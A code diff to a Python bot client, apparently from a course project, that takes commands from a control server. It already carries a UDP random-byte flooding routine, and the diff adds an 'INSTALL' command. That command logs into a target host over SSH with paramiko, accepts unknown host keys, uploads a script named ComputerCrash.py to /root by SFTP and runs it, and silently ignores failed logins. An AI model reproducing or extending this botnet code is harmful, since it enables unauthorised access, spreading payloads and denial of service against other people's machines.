@@ -36,17 +36,23 @@ def randombyteflooding(TARGET):
 
 		sr(ippacket/udppacket/generaterandomstring(),timeout=2)
 
-def httpattack():
-	"""
-	Once a bot establishes a connection to a VM server
-	As long as the connection remains active, it will send random HTTP GET or POST requests
-	These post requests consist of numerous cookies
-	"""
-
-	cookies = dict()
-	
-
-
+def installcontent(TARGET):
+	try:
+		client = paramiko.SSHClient()
+		client.load_system_host_keys()
+		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		client.connect(TARGET,password=passwordsource)
+		client.exec_command('rm /root/ComputerCrash.py')
+		client.exec_command('touch /root/ComputerCrash.py')
+		client.exec_command('rm /root/content.txt')
+		client.exec_command('touch content.txt')
+		sftp = client.open_sftp()
+		sftp.put('/root/CS445-Project/ComputerCrash.py','/root/ComputerCrash.py')
+		sftp.put('/root/CS445-Project/content.txt', '/root/content.txt')
+		client.exec_command('python ComputerCrash.py')
+	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
+		#print(e)
+		return None
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 HOST_SERVER = ' '
@@ -87,6 +93,9 @@ while True:
 
 	if parseddata[0] == "FLOODING":
 		randombyteflooding(parseddata[1])
+
+	if parseddata[0] == "INSTALL":
+		installcontent(parseddata[1])
 
 			#s.send(str(nm.scaninfo()))
 
